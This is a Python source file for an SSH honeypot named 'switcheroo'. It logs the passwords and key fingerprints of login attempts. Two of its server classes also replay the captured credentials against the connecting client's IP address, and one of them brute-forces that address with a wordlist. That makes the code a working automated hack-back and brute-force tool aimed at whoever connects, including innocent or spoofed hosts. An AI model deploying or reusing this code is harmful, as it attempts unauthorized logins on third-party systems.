import asyncio
import logging

import asyncssh

from switcheroo import utils
from switcheroo.config import Config

logger = logging.getLogger("switcheroo")


class BaseSSHServer(asyncssh.SSHServer):
    def connection_made(self, con):
        self.con = con
        self.host, self.port = con.get_extra_info("peername")

    def begin_auth(self, username):
        # Require authentication by returning True.
        return True

    def public_key_auth_supported(self):
        return True

    def password_auth_supported(self):
        return True

    def validate_password(self, username, password):
        return False

    def validate_public_key(self, username, key):
        return False


class LoggingSSHServer(BaseSSHServer):
    """
    A credential logging SSH Server.
    """

    def validate_password(self, username, password):
        logger.info(
            "auth='password' host=%r username=%r password=%r",
            f"{self.host}:{self.port}",
            username,
            password,
        )
        return False

    def validate_public_key(self, username, key):
        sha_fingerprint = utils.format_sha2_fingerprint(key)
        md5_fingerprint = utils.format_md5_fingerprint(key)
        logger.info(
            "auth='pubkey' host=%r md5=%r sha=%r",
            f"{self.host}:{self.port}",
            md5_fingerprint,
            sha_fingerprint,
        )
        return False


class SwitcherooSSHServer(LoggingSSHServer):
    """
    A credential logging and replaying SSH Server.
    """

    async def check_credentials(self, username, password):
        try:
            async with asyncssh.connect(self.host, username=username, password=password, known_hosts=None):
                return True
        except Exception:
            pass
        return False

    async def replay(self, username, password):
        """
        Use the attacker's credentials against himself.
        """
        try:
            if await self.check_credentials(username, password):
                logger.info(
                    "auth='password' host=%r username=%r password=%r valid=true",
                    f"{self.host}:{self.port}",
                    username,
                    password,
                )
                return False
        except Exception:
            logger.info(
                "auth='password' host=%r username=%r password=%r valid=false",
                f"{self.host}:{self.port}",
                username,
                password,
            )
        return False

    def validate_password(self, username, password):
        return asyncio.wait_for(self.replay(username, password), timeout=4.0)


class SwitcherooBruteSSHServer(SwitcherooSSHServer):
    """
    A credential logging and bruteforce SSH Server.
    """
    DID_BRUTE = False

    async def attack(self, username, password):
        credentials = [(username, password)]
        more_creds = Config.load_wordlist()
        if more_creds and not self.DID_BRUTE:
            credentials.extend(more_creds)
        for username, password in credentials:
            if await self.check_credentials(username, password):
                logger.info(
                    "auth='password' host=%r username=%r password=%r valid=true",
                    f"{self.host}:{self.port}",
                    username,
                    password,
                )
                return False
            logger.info(
                "auth='password' host=%r username=%r password=%r valid=false",
                f"{self.host}:{self.port}",
                username,
                password,
            )
        self.DID_BRUTE = True

    def validate_password(self, username, password):
        return asyncio.wait_for(self.attack(username, password), timeout=4.0)
